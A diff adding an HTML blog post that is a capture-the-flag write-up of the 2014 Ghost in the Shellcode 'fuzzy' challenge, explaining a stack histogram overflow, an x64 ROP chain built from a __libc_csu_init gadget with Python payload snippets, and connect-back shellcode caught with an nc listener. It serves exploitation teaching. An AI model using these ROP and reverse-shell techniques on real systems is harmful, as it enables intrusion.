@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <title>Ghost in the Shellcode 2014 - fuzzy</title>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" href="http://codearcana.com/theme/css/main.css" type="text/css" />
+        <link href="http://codearcana.com/" type="application/atom+xml" rel="alternate" title="Code Arcana ATOM Feed" />
+
+
+        <!--[if IE]>
+                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+        <!--[if lte IE 7]>
+                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie.css"/>
+                <script src="http://codearcana.com/js/IE8.js" type="text/javascript"></script><![endif]-->
+
+        <!--[if lt IE 7]>
+                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie6.css"/><![endif]-->
+
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="http://codearcana.com/index.html">Code Arcana </a></h1>
+                <nav><ul>
+                    <li><a href="http://codearcana.com">Blog</a></li>
+                    <li><a href="http://codearcana.com/archives.html">Archives</a></li>
+                    <li ><a href="http://codearcana.com/pages/about.html">About</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+
+<section id="content" class="body">
+<article>
+        <header> <h1 class="entry-title"><a href="posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html"
+        rel="bookmark" title="Permalink to Ghost in the Shellcode 2014 - <code>fuzzy</code>">Ghost in the Shellcode 2014 - <code>fuzzy</code></a></h1> <a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="awreece">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
+ </header>
+<footer class="post-info">
+        <abbr class="published" title="2014-01-19T00:00:00">
+                Sun 19 January 2014
+        </abbr>
+
+        <address class="vcard author">
+                By <a class="url fn" href="http://codearcana.com/author/alex-reece.html">Alex Reece</a>
+        </address>
+<p>In <a href="http://codearcana.com/category/security.html">security</a>. </p>
+<p>tags: <a href="http://codearcana.com/tag/ctf.html">ctf</a><a href="http://codearcana.com/tag/exploitation.html">exploitation</a></p></footer><!-- /.post-info --><!-- /.post-info -->
+        <div class="entry-content">
+        <p>tl;dr - <code>fuzzy</code> is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
+buckets past the end of the buffer if non ascii text is provided, allowing us to
+rop. Binary and exploit available <a
+href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz">here</a>.
+Cross post from <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1146">PPP
+blog</a>.</p>
+<h2>The program</h2>
+<p><code>fuzzy</code> is a "super secure parsing engine", that includes a histogram function:</p>
+<div class="highlight"><pre><span class="gp">$</span> nc fuzzy.2014.ghostintheshellcode.com 4141
+<span class="go">Welcome to the super secure parsing engine!</span>
+<span class="go">Please select a parser!</span>
+
+<span class="go">1) Sentence histogram</span>
+<span class="go">2) Sorted characters (ascending)</span>
+<span class="go">3) Sorted characters (decending)</span>
+<span class="go">4) Sorted ints (ascending)</span>
+<span class="go">5) Sorted ints (decending</span>
+<span class="go">6) global_find numbers in string</span>
+<span class="go">1</span>
+<span class="go">Enter a series of characters</span>
+<span class="go">hello</span>
+<span class="go"> :0 !:0 &quot;:0 #:0 $:0 </span>
+<span class="gp">%</span>:0 &amp;:0 <span class="err">&#39;</span>:0 <span class="o">(</span>:0 <span class="o">)</span>:0 
+<span class="go">... &lt;snip&gt; ...</span>
+<span class="go">a:0 b:0 c:0 d:0 e:1 </span>
+<span class="go">f:0 g:0 h:1 i:0 j:0 </span>
+<span class="go">k:0 l:2 m:0 n:0 o:1 </span>
+<span class="go">p:0 q:0 r:0 s:0 t:0 </span>
+<span class="go">u:0 v:0 w:0 x:0 y:0 </span>
+<span class="go">z:0 {:0 |:0 }:0</span>
+</pre></div>
+
+
+<p>As you can see, it computes a histogram of the input. This histogram
+is constructed using a buffer that is on the stack, so if we send it
+non-ascii text we can write to the stack. By modifying the saved <code>ebp</code>,
+we can point the stack to a buffer we control. </p>
+<p>Unfortunately, this is a bit challenging to figure out because all 
+the interesting functions are encrypted. Fortunately for us, the "encryption"
+is just bitwise not. Using our favorite hex editor, we make a new binary with 
+the decrypted functions to reverse.</p>
+<p>With control of the stack, we get control over rip and can ROP.
+We will use the <code>callFunction</code> function, which decrypts a function
+into an executable page and then runs it. Our goal will be to <code>read</code> encrypted shellcode
+into a known location (there is a convenient buffer <code>dontcollide</code> in the data
+section that is never used), then invoke <code>callFunction</code> to run our shellcode. 
+Unfortunately, since this is x64, we need to find a good gadget to be able to
+control registers and call functions. Luckily, there is a good gadget in 
+<code>__libc_csu_init</code>:</p>
+<div class="highlight"><pre><span class="nl">loc_401790:</span>                             <span class="c1">; CODE XREF: __libc_csu_init+64j</span>
+                <span class="nf">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nv">r13</span>
+                <span class="nf">mov</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nv">r14</span>
+                <span class="nf">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">r15d</span>
+                <span class="nf">call</span>    <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="nb">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
+                <span class="nf">add</span>     <span class="nb">rbx</span><span class="p">,</span> <span class="mi">1</span>
+                <span class="nf">cmp</span>     <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rbp</span>
+                <span class="nf">jnz</span>     <span class="nv">short</span> <span class="nv">loc_401790</span>
+
+<span class="nl">loc_4017A6:</span>                             <span class="c1">; CODE XREF: __libc_csu_init+4Aj</span>
+                <span class="nf">mov</span>     <span class="nb">rbx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
+                <span class="nf">mov</span>     <span class="nb">rbp</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">10h</span><span class="p">]</span>
+                <span class="nf">mov</span>     <span class="nv">r12</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">18h</span><span class="p">]</span>
+                <span class="nf">mov</span>     <span class="nv">r13</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">20h</span><span class="p">]</span>
+                <span class="nf">mov</span>     <span class="nv">r14</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">28h</span><span class="p">]</span>
+                <span class="nf">mov</span>     <span class="nv">r15</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">30h</span><span class="p">]</span>
+                <span class="nf">add</span>     <span class="nb">rsp</span><span class="p">,</span> <span class="mh">38h</span>
+                <span class="nf">retn</span>
+</pre></div>
+
+
+<p>This gadget allows us to control the first three  registers we need an call 
+anything we have function pointer to. The program uses a large function pointer table to enable
+the encrypted functions to call library functions, so we have pointers to many
+library functions. Unfortunately, we do <em>not</em> have a pointer to <code>readAll</code>, so we
+cannot use it with our gadget. Furthermore, our gadget only controls 3 arguments,
+so we cannot easily use <code>recv</code>. Lastly, we cannot use the encrypted <code>my_readAll</code>
+function (that we have a pointer to) because it reads its arguments out of a
+buffer and we don't have an easy way to call functions with a buffer we control 
+as an argument. Still, this gadget allows us to chain calls arbitrary function pointers
+with 3 arguments:</p>
+<div class="highlight"><pre><span class="c"># Assumes rip points to loc_4017A6.</span>
+<span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">function_ptr</span><span class="p">,</span> <span class="n">arg0</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">):</span>
+  <span class="c"># Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to</span>
+  <span class="c"># loc_4017A6 for repeated calls.</span>
+  <span class="c">#      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi</span>
+  <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">function_ptr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">arg2</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">arg1</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">arg0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">__libc_csu_init_gadget</span><span class="p">)</span>
+</pre></div>
+
+
+<p>Instead, we make a function pointer to <code>readAll</code> in the data section that we can use our
+gadget.
+We call <code>memset</code> 4 times, once for each distinct byte in
+the the address of <code>readAll</code>, and make <code>dontcollide</code> a pointer to <code>readAll</code>.</p>
+<div class="highlight"><pre><span class="c"># Set dontcollide to be a function pointer to readAll (0x4013cb).</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</pre></div>
+
+
+<p>We then can use our gadget to call <code>readAll</code>, 
+reading the encrypted shellcode into <code>dontcollide</code>, and then again to call
+<code>callFunction</code>, executing our shellcode. </p>
+<div class="highlight"><pre><span class="c"># Read the shellcode into a buffer. The socket to read from is 4.</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">dontcollide</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+
+<span class="c"># Call our shellcode.</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">callEncryptedFunction_fptr</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</pre></div>
+
+
+<p>We grab some connect back shellcode 
+and get a shell:</p>
+<div class="highlight"><pre><span class="go">~% python fuzzy.py                                           [console 1]</span>
+<span class="go">~% nc -l 16705                                               [console 2]</span>
+<span class="go">cat key.txt</span>
+<span class="go">key is: fuzzingIsFun2</span>
+</pre></div>
+        </div><!-- /.entry-content -->
+        <div class="comments">
+        <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+               var disqus_identifier = "posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html";
+               (function() {
+               var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+               dsq.src = 'http://codearcana.disqus.com/embed.js';
+               (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+              })();
+            </script>
+        </div>
+
+</article>
+</section>
+
+        <aside id="sidebar">
+                <div class="widget">
+                        <h2>Categories</h2>
+                        <ul>
+                           <li ><a href="http://codearcana.com/category/performance.html">performance</a></li>
+                           <li class="active"><a href="http://codearcana.com/category/security.html">security</a></li>
+                           <li ><a href="http://codearcana.com/category/software-engineering.html">software engineering</a></li>
+                        </ul>
+		</div>
+		<div class="widget">
+		    <h2>Tags</h2>
+		    <ul class="cloud">
+			<li class="tag-2">
+			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/mac-osx.html">mac osx</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/bash.html">bash</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
+			</li>
+			<li class="tag-2">
+			  <a class="tag" href="http://codearcana.com/tag/ctf.html">ctf</a>
+			</li>
+			<li class="tag-1">
+			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
+			</li>
+			<li class="tag-4">
+			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
+			</li>
+			<li class="tag-1">
+			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
+			</li>
+			<li class="tag-1">
+			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
+			</li>
+		    </ul>
+		</div>
+
+
+                <div class="widget blogroll">
+                        <h2>Blogroll</h2>
+                        <ul>
+                            <li><a href="http://ppp.cylab.cmu.edu/wordpress/">PPP Blog</a></li>
+                            <li><a href="http://www.codinghorror.com/blog/">Coding Horror</a></li>
+                            <li><a href="http://blog.regehr.org/">Embedded in Academia</a></li>
+                            <li><a href="http://highscalability.com/">High Scalability</a></li>
+                            <li><a href="http://coderweekly.com/">Coder Weekly</a></li>
+                            <li><a href="http://www.phrack.org/">phrack</a></li>
+                            <li><a href="http://jbremer.org/">skier_'s blog</a></li>
+                            <li><a href="http://dtrace.org/blogs">dtrace blog</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="widget social">
+                        <h2>Social</h2>
+			<ul>
+                            <li><a href="http://codearcana.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+				<li><a href="https://twitter.com/awreece">twitter</a></li>
+				<li><a href="https://github.com/awreece">github</a></li>
+				<li><a href="https://plus.google.com/106589059588263736517/posts">google+</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </aside><!-- /#sidebar -->
+    <script type="text/javascript">
+    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+    try {
+        var pageTracker = _gat._getTracker("UA-40107691-1");
+    pageTracker._trackPageview();
+    } catch(err) {}</script>
+</body>
+</html>
